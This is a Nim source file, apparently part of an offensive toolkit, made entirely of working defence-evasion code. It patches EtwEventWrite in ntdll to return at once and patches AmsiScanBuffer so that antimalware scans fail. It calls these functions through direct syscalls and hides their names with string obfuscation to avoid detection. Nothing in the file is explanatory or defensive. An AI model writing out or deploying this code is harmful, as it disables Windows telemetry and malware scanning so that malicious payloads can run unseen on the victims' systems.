import static_strs
import dynlib
import nimvoke/syscalls

from winim/lean import DWORD, ULONG, HANDLE, PAGE_EXECUTE_READWRITE, `&`

const 
  ETW_PATCH*: array[1, byte] = [byte 0xC3]
  AMSI_PATCH*: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]

proc patchEEW*(): int =
  var
    ntdll: LibHandle 
    eewAddr: pointer 
    temp: DWORD
    bytesWritten: ULONG
    oldProtect: ULONG
    hProcess: HANDLE = 0xFFFFFFFFFFFFFFFF

  ntdll = loadLib(jam("ntdll"))
  if isNil(ntdll):
    return 1

  eewAddr = ntdll.symAddr(jam("EtwEventWrite"))
  if isNil(eewAddr):
    return 1
  
  var patchAddr = eewAddr
  var pLen = cast[ULONG](ETW_PATCH.len)
  var status = syscall(NtProtectVirtualMemory, hProcess, &eewAddr, &pLen, cast[ULONG](PAGE_EXECUTE_READWRITE), &oldProtect)

  if status == 0:
    var ret = syscall(NtWriteVirtualMemory, hProcess, patchAddr, unsafeAddr ETW_PATCH, ETW_PATCH.len, addr bytesWritten)
    discard syscall(NtProtectVirtualMemory, hProcess, &eewAddr, &pLen, oldProtect, &temp)
    return 0

proc patchASB*(): int =  
  var 
    amsi: LibHandle 
    asbAddr: pointer 
    temp: DWORD
    bytesWritten: ULONG
    oldProtect: ULONG
    hProcess: HANDLE = 0xFFFFFFFFFFFFFFFF 

  amsi = loadLib(jam("amsi"))
  if isNil(amsi):
    return 1

  asbAddr = amsi.symAddr(jam("AmsiScanBuffer"))
  if isNil(asbAddr):
    return 1

  var patchAddr = asbAddr
  var pLen = cast[ULONG](AMSI_PATCH.len)
  var status = syscall(NtProtectVirtualMemory, hProcess, &asbAddr, &pLen, cast[ULONG](PAGE_EXECUTE_READWRITE), &oldProtect)
  
  if status == 0:
    var ret = syscall(NtWriteVirtualMemory, hProcess, patchAddr, unsafeAddr AMSI_PATCH, AMSI_PATCH.len, addr bytesWritten)
    discard syscall(NtProtectVirtualMemory, hProcess, &asbAddr, &pLen, oldProtect, &temp)
    return 0